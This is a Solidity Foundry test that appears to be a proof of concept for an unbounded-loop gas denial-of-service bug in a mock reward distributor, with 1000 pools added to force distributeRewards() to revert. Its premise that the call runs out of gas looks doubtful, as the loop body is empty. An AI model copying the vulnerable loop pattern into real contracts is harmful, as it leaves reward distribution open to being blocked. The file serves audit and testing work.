// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IDistributor {
    function distributeRewards() external;
}

contract MockDistributor is IDistributor {
    address[] public depositPoolAddresses;
    mapping(address => uint256[]) public depositPools;

    function addDepositPool(address poolAddress, uint256 poolId) external {
        depositPoolAddresses.push(poolAddress);
        depositPools[poolAddress].push(poolId);
    }

    function distributeRewards() external override {
        for (uint256 i = 0; i < depositPoolAddresses.length; i++) {
            address poolAddress = depositPoolAddresses[i];
            for (uint256 j = 0; j < depositPools[poolAddress].length; j++) {
                // Simulate reward distribution logic
            }
        }
    }
}

contract ExploitTest is Test {
    MockDistributor distributor;

    function setUp() public {
        // Deploy the mock distributor contract
        distributor = new MockDistributor();

        // Simulate adding a large number of deposit pools
        for (uint256 i = 0; i < 1000; i++) {
            distributor.addDepositPool(address(uint160(i)), i);
        }
    }

    function test_exploit() public {
        // Expect the distributeRewards function to revert due to out-of-gas
        vm.expectRevert();

        // Call the vulnerable function
        distributor.distributeRewards();
    }
}